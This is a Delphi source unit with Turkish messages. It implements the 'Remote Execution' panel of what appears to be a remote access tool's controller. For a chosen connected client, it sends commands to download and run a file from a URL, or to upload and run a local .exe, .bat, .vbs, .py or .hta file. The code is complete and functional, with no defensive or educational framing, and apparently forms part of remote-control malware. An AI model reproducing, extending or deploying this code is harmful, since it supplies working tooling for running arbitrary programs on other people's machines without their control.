unit UnitRemoteExecution;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.StdCtrls, System.JSON,
  System.NetEncoding, ncLines;

type
  TSendJSONProc = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TUnregisterProc = procedure(aLine: TncLine) of object;

  TForm11 = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    Edit1: TEdit;
    Button1: TButton;
    Label1: TLabel;
    Edit2: TEdit;
    Label2: TLabel;
    Button2: TButton;
    Button3: TButton;
    Label3: TLabel;
    Edit3: TEdit;
    Button4: TButton;
    Button5: TButton;

    procedure Button1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);

  private
    FLine: TncLine;
    FClientID: string;
    FSendJSON: TSendJSONProc;
    FOnCloseProc: TUnregisterProc;
    FOpenDialog: TOpenDialog;

    function IsAllowedExtension(const AFileName: string): Boolean;
    function GetBase64FileContent(const AFilePath: string): string;

  public
    procedure SetupForClient(ALine: TncLine; const AClientID: string;
      ASendJSON: TSendJSONProc; AOnCloseProc: TUnregisterProc);
    procedure DetachCallbacks;
    procedure HandleResponse(JSONObj: TJSONObject);
  end;

var
  Form11: TForm11;

implementation

{$R *.dfm}

procedure TForm11.FormCreate(Sender: TObject);
begin
  FOpenDialog := TOpenDialog.Create(Self);
  FOpenDialog.Filter := 'Allowed Executables (*.exe;*.bat;*.vbs;*.py;*.hta)|*.exe;*.bat;*.vbs;*.py;*.hta';
end;

function TForm11.IsAllowedExtension(const AFileName: string): Boolean;
var
  Ext: string;
begin
  Ext := LowerCase(ExtractFileExt(AFileName));
  Result := (Ext = '.exe') or (Ext = '.bat') or (Ext = '.vbs') or (Ext = '.py') or (Ext = '.hta');
end;

function TForm11.GetBase64FileContent(const AFilePath: string): string;
var
  FS: TFileStream;
  Bytes: TBytes;
begin
  Result := '';
  if not FileExists(AFilePath) then Exit;
  try
    FS := TFileStream.Create(AFilePath, fmOpenRead or fmShareDenyWrite);
    try
      SetLength(Bytes, FS.Size);
      if FS.Size > 0 then
        FS.ReadBuffer(Bytes[0], FS.Size);
      Result := TNetEncoding.Base64.EncodeBytesToString(Bytes);
    finally
      FS.Free;
    end;
  except
    Result := '';
  end;
end;

procedure TForm11.SetupForClient(ALine: TncLine; const AClientID: string;
  ASendJSON: TSendJSONProc; AOnCloseProc: TUnregisterProc);
begin
  FLine := ALine;
  FClientID := AClientID;
  FSendJSON := ASendJSON;
  FOnCloseProc := AOnCloseProc;
  Caption := 'Remote Execution - Client: ' + FClientID;
end;

procedure TForm11.DetachCallbacks;
begin
  FLine := nil;
  FSendJSON := nil;
  FOnCloseProc := nil;
end;

procedure TForm11.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  Action := caFree;
  if Assigned(FOnCloseProc) and Assigned(FLine) then
    FOnCloseProc(FLine);
end;

procedure TForm11.Button1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
  URL: string;
  CleanURL: string;
  QueryPos: Integer;
begin
  URL := Trim(Edit1.Text);
  if URL = '' then
  begin
    MessageBox(Handle, 'Lütfen geçerli bir uzak dosya adresi girin.', 'Hata', MB_OK or MB_ICONERROR);
    Exit;
  end;

  CleanURL := URL;
  QueryPos := Pos('?', CleanURL);
  if QueryPos > 0 then
    CleanURL := Copy(CleanURL, 1, QueryPos - 1);

  if not IsAllowedExtension(CleanURL) then
  begin
    MessageBox(Handle, 'Sadece .exe, .bat, .vbs, .py ve .hta dosya türleri desteklenir.', 'Hata', MB_OK or MB_ICONERROR);
    Exit;
  end;

  if Assigned(FSendJSON) and Assigned(FLine) then
  begin
    JSONObj := TJSONObject.Create;
    try
      JSONObj.AddPair('action', 'remote_execute_url');
      JSONObj.AddPair('url', URL);
      FSendJSON(FLine, JSONObj);
      MessageBox(Handle, 'Uzak dosya çalıştırma komutu gönderildi.', 'Bilgi', MB_OK or MB_ICONINFORMATION);
    finally
      JSONObj.Free;
    end;
  end;
end;

procedure TForm11.Button3Click(Sender: TObject);
begin
  if FOpenDialog.Execute then
  begin
    if IsAllowedExtension(FOpenDialog.FileName) then
      Edit2.Text := FOpenDialog.FileName
    else
      MessageBox(Handle, 'Sadece .exe, .bat, .vbs, .py ve .hta dosya türleri seçilebilir.', 'Hata', MB_OK or MB_ICONERROR);
  end;
end;

procedure TForm11.Button2Click(Sender: TObject);
var
  FilePath: string;
  FileName: string;
  Content64: string;
  JSONObj: TJSONObject;
begin
  FilePath := Trim(Edit2.Text);
  if FilePath = '' then
  begin
    MessageBox(Handle, 'Lütfen önce bir dosya seçin.', 'Hata', MB_OK or MB_ICONERROR);
    Exit;
  end;

  if not FileExists(FilePath) then
  begin
    MessageBox(Handle, 'Belirtilen dosya bulunamadı.', 'Hata', MB_OK or MB_ICONERROR);
    Exit;
  end;

  FileName := ExtractFileName(FilePath);
  if not IsAllowedExtension(FileName) then
  begin
    MessageBox(Handle, 'Sadece .exe, .bat, .vbs, .py ve .hta dosya türleri desteklenir.', 'Hata', MB_OK or MB_ICONERROR);
    Exit;
  end;

  Content64 := GetBase64FileContent(FilePath);
  if Content64 = '' then
  begin
    MessageBox(Handle, 'Dosya okunamadı veya boş.', 'Hata', MB_OK or MB_ICONERROR);
    Exit;
  end;

  if Assigned(FSendJSON) and Assigned(FLine) then
  begin
    JSONObj := TJSONObject.Create;
    try
      JSONObj.AddPair('action', 'remote_execute_local');
      JSONObj.AddPair('filename', FileName);
      JSONObj.AddPair('content', Content64);
      FSendJSON(FLine, JSONObj);
      MessageBox(Handle, 'Yerel dosya yükleme ve çalıştırma komutu gönderildi.', 'Bilgi', MB_OK or MB_ICONINFORMATION);
    finally
      JSONObj.Free;
    end;
  end;
end;

procedure TForm11.HandleResponse(JSONObj: TJSONObject);
var
  Status: string;
  Msg: string;
begin
  Status := '';
  Msg := '';
  if Assigned(JSONObj.Values['status']) then Status := JSONObj.Values['status'].Value;
  if Assigned(JSONObj.Values['message']) then Msg := JSONObj.Values['message'].Value;

  if SameText(Status, 'success') then
    MessageBox(Handle, PChar('İşlem Başarılı: ' + Msg), 'Bilgi', MB_OK or MB_ICONINFORMATION)
  else
    MessageBox(Handle, PChar('Hata Oluştu: ' + Msg), 'Hata', MB_OK or MB_ICONERROR);
end;

end.